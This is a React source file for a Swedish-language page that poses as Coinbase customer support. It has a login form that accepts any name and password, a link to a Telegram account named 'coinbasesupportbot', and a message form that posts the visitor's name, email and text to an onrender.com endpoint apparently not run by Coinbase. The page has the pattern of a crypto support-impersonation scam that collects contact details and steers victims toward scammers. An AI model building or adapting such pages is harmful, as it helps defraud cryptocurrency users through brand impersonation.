import React, { useState } from "react";
import ReactDOM from "react-dom/client";

function App() {
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [loggedIn, setLoggedIn] = useState(false);
  const [sent, setSent] = useState(false);

  const handleLogin = () => {
    if (name.trim() && password.trim()) {
      setLoggedIn(true);
    }
  };

  const sendEmail = async () => {
    if (!email || !message) return;
    await fetch("https://coinbase-chat-api.onrender.com/send-support-message", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, email, message })
    });
    setSent(true);
    setEmail("");
    setMessage("");
    setTimeout(() => setSent(false), 3000);
  };

  return (
    <div style={wrapper}>
      <div style={box}>
        <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png?v=026" alt="Coinbase Logo"
          style={{ width: 70, height: 70, filter: 'brightness(0) invert(1)', marginBottom: 20 }} />
        {!loggedIn ? (
          <>
            <h2 style={{ marginBottom: 20 }}>Logga in till support</h2>
            <input style={inputStyle} placeholder="Ditt namn" value={name} onChange={(e) => setName(e.target.value)} />
            <input type="password" style={inputStyle} placeholder="Lösenord" value={password} onChange={(e) => setPassword(e.target.value)} />
            <button style={buttonStyle} onClick={handleLogin}>Logga in</button>
          </>
        ) : (
          <>
            <h2>Välkommen, {name}</h2>
            <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
              💬 Kontakta oss via Telegram
            </a>
            <p style={{ marginTop: 30 }}>Eller skicka ett meddelande via e-post:</p>
            <input style={inputStyle} placeholder="Din e-post" value={email} onChange={(e) => setEmail(e.target.value)} />
            <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Meddelande" value={message} onChange={(e) => setMessage(e.target.value)} />
            <button style={buttonStyle} onClick={sendEmail}>📨 Skicka meddelande</button>
            {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Meddelandet skickades!</p>}
          </>
        )}
      </div>
    </div>
  );
}

const wrapper = {
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  minHeight: '100vh',
  backgroundColor: '#0a0f1c'
};

const box = {
  width: '100%',
  maxWidth: 500,
  background: '#1e293b',
  padding: 30,
  borderRadius: 12,
  boxShadow: '0 0 20px rgba(0,0,0,0.3)',
  textAlign: 'center'
};

const inputStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  border: "1px solid #334155",
  backgroundColor: "#0f172a",
  color: "#f8fafc",
  fontSize: "16px",
  marginBottom: "10px"
};

const buttonStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#3b82f6",
  color: "#fff",
  border: "none",
  cursor: "pointer",
  fontSize: "16px",
  marginTop: "10px"
};

const linkButton = {
  display: "block",
  margin: "20px auto",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#2563eb",
  color: "#fff",
  fontWeight: "600",
  textDecoration: "none",
  width: "100%"
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
